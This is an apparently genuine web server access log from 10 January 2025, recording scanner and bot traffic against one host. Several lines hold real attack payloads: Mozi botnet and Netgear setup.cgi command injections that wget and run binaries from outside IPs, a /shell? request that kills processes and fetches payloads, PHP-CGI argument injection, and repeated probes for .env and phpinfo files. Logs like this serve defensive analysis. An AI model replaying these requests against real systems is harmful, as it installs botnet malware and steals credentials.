66.240.205.34 - - [10/Jan/2025:00:06:01 +0000] "Gh0st\xad" 400 526 "-" "-"
185.16.39.104 - - [10/Jan/2025:02:35:55 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
51.254.59.113 - - [10/Jan/2025:02:36:32 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
125.229.52.69 - - [10/Jan/2025:02:50:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [10/Jan/2025:02:53:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:02:53:36 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [10/Jan/2025:03:02:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [10/Jan/2025:03:06:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:03:06:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
152.42.219.47 - - [10/Jan/2025:03:07:13 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [10/Jan/2025:03:07:19 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
162.216.150.43 - - [10/Jan/2025:03:14:42 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
205.210.31.132 - - [10/Jan/2025:03:25:38 +0000] "\x16\x03\x01" 400 526 "-" "-"
205.210.31.132 - - [10/Jan/2025:03:25:39 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.93 - - [10/Jan/2025:03:33:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:03:33:05 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
192.155.90.118 - - [10/Jan/2025:03:46:25 +0000] "\x16\x03\x01" 400 526 "-" "-"
95.214.55.186 - - [10/Jan/2025:03:51:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
98.4.166.247 - - [10/Jan/2025:03:54:50 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [10/Jan/2025:04:05:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [10/Jan/2025:04:14:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:04:14:32 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [10/Jan/2025:04:17:51 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [10/Jan/2025:04:20:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:04:20:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [10/Jan/2025:04:45:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.55.186 - - [10/Jan/2025:04:53:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
147.185.132.54 - - [10/Jan/2025:05:23:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.93 - - [10/Jan/2025:05:44:21 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:05:44:22 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
192.155.90.118 - - [10/Jan/2025:05:45:44 +0000] "\x16\x03\x01" 400 526 "-" "-"
87.120.115.119 - - [10/Jan/2025:05:46:08 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Googlebot/2.1 ( http://www.googlebot.com/bot.html)"
78.153.140.149 - - [10/Jan/2025:05:48:01 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:05:48:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
188.228.190.50 - - [10/Jan/2025:06:06:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [10/Jan/2025:06:09:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:06:09:34 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.230.66.10 - - [10/Jan/2025:06:25:11 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 526 "-" "-"
78.153.140.93 - - [10/Jan/2025:06:27:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:06:27:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.180.140.5 - - [10/Jan/2025:06:27:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:06:46:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:06:46:16 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [10/Jan/2025:07:02:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
176.240.200.126 - - [10/Jan/2025:07:06:52 +0000] "HEAD / HTTP/1.1" 200 296 "-" "curl/8.5.0"
43.163.6.124 - - [10/Jan/2025:07:10:19 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
139.162.84.112 - - [10/Jan/2025:07:14:18 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
113.237.106.67 - - [10/Jan/2025:07:18:25 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://113.237.106.67:37024/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
95.214.55.226 - - [10/Jan/2025:07:19:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [10/Jan/2025:07:29:32 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:07:29:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
184.105.139.69 - - [10/Jan/2025:07:29:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
184.105.139.69 - - [10/Jan/2025:07:33:01 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
184.105.139.69 - - [10/Jan/2025:07:33:52 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
85.66.137.28 - - [10/Jan/2025:07:43:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
179.43.191.146 - - [10/Jan/2025:07:48:57 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.11.119 - - [10/Jan/2025:08:02:57 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/141.98.10.40/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/141.98.10.40/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
18.216.130.143 - - [10/Jan/2025:08:09:49 +0000] "\x16\x03\x01" 400 526 "-" "-"
18.216.130.143 - - [10/Jan/2025:08:10:21 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
185.16.39.104 - - [10/Jan/2025:08:27:59 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
203.152.216.16 - - [10/Jan/2025:08:33:55 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+allow_url_include%3Don+%ADd+auto_prepend_file%3Dphp%3A//input HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
203.152.216.16 - - [10/Jan/2025:08:33:55 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
203.152.216.16 - - [10/Jan/2025:08:33:55 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
203.152.216.16 - - [10/Jan/2025:08:33:55 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
78.153.140.149 - - [10/Jan/2025:08:40:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:08:40:25 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.98.11.119 - - [10/Jan/2025:08:49:05 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/141.98.10.40/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/141.98.10.40/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.93 - - [10/Jan/2025:08:53:05 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:08:53:05 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [10/Jan/2025:08:54:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
183.106.181.107 - - [10/Jan/2025:08:55:02 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.101.152.210 - - [10/Jan/2025:08:57:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
46.101.152.210 - - [10/Jan/2025:08:57:37 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
46.101.152.210 - - [10/Jan/2025:08:57:37 +0000] "GET /odinhttpcall1736499456 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
46.101.152.210 - - [10/Jan/2025:08:57:37 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
46.101.152.210 - - [10/Jan/2025:08:57:37 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
46.101.152.210 - - [10/Jan/2025:08:57:37 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
46.101.152.210 - - [10/Jan/2025:08:57:37 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
46.101.152.210 - - [10/Jan/2025:08:57:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.101.166.184 - - [10/Jan/2025:08:57:38 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
209.38.235.13 - - [10/Jan/2025:08:57:38 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.235.13 - - [10/Jan/2025:08:57:38 +0000] "\x16\x03\x01" 400 526 "-" "-"
209.38.235.13 - - [10/Jan/2025:08:57:38 +0000] "GET /solr/admin/info/system HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
64.226.78.1 - - [10/Jan/2025:08:57:38 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
206.189.147.8 - - [10/Jan/2025:08:57:39 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
46.101.166.184 - - [10/Jan/2025:08:57:39 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/cgi-bin/authLogin.cgi" "Go-http-client/1.1"
209.38.235.13 - - [10/Jan/2025:08:57:39 +0000] "\x16\x03\x01" 400 526 "-" "-"
209.38.235.13 - - [10/Jan/2025:08:57:39 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/solr/admin/info/system" "Go-http-client/1.1"
64.226.78.1 - - [10/Jan/2025:08:57:39 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
206.189.147.8 - - [10/Jan/2025:08:57:39 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/favicon.ico" "Go-http-client/1.1"
209.38.235.13 - - [10/Jan/2025:08:57:39 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
209.38.235.13 - - [10/Jan/2025:08:57:40 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/solr/admin/cores?action=STATUS&wt=json" "Go-http-client/1.1"
68.183.69.149 - - [10/Jan/2025:08:59:44 +0000] "GET /v2/_catalog HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
68.183.69.149 - - [10/Jan/2025:08:59:45 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/v2/_catalog" "Go-http-client/1.1"
154.213.184.132 - - [10/Jan/2025:09:08:31 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
98.96.216.126 - - [10/Jan/2025:09:19:02 +0000] "CONNECT www.baidu.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
141.98.11.119 - - [10/Jan/2025:09:22:47 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/141.98.10.40/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/141.98.10.40/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
193.41.206.36 - - [10/Jan/2025:09:24:30 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:30 +0000] "GET /.svn/wc.db HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:30 +0000] "GET /app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:30 +0000] "GET /backend/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:30 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:31 +0000] "GET /_phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:31 +0000] "GET /_profiler/phpinfo/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:31 +0000] "GET /_profiler/phpinfo/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:31 +0000] "GET /laravel/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:31 +0000] "GET /xampp/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:32 +0000] "GET /xampp/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:32 +0000] "GET /api/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:32 +0000] "GET /api/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:32 +0000] "GET /xampp/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:32 +0000] "GET /user/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:33 +0000] "GET /v1/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:33 +0000] "GET /v2/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:33 +0000] "GET /server/laravel/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:33 +0000] "GET /server/s3.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:33 +0000] "GET /s3.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:34 +0000] "GET /saas/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:34 +0000] "GET /root/.env HTTP/1.1" 302 386 "-" "-"
